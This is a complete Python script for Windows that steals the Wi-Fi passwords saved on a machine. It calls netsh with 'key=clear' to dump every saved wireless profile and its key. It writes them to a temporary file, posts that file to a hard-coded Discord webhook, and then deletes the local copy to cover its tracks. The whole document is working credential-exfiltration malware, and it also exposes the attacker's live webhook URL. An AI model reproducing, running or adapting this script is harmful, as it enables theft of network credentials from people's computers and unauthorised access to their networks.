import os
import subprocess
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255615157221195877/OHNjGv4u3xNOUYvFF3W24s30Khg-RVVN9cEEbyVg9LYJOPsSmUQrp38cOofpFZQ8S8Xk'

def sendfile(path):
    files = {'file': open(path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, files=files)
        if response.status_code == 200:
            print("Sent successfully.")
        else:
            print(f"Failed. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed: {e}")

def get_networks():
    networks = {}
    try:
        output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
        
        for profile in profiles:
            if profile:
                networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except OSError as e:
        print(f"OS Error: {e}")
    return networks

def save_networks(networks, path):
    if networks:
        with open(path, 'w', encoding='utf-8') as f:
            for network, info in networks.items():
                f.write(f"Network: {network}\n")
                f.write(f"{info}\n")
                f.write("="*40 + "\n")
    else:
        with open(path, 'w', encoding='utf-8') as f:
            f.write("No wifi networks found.")

def main():
    temp_path = 'wifi_networks.txt'
    networks = get_networks()
    save_networks(networks, temp_path)
    
    if os.path.exists(temp_path):
        sendfile(temp_path)
        os.remove(temp_path)
    else:
        print("No data or failed to save.")

if __name__ == '__main__':
    main()
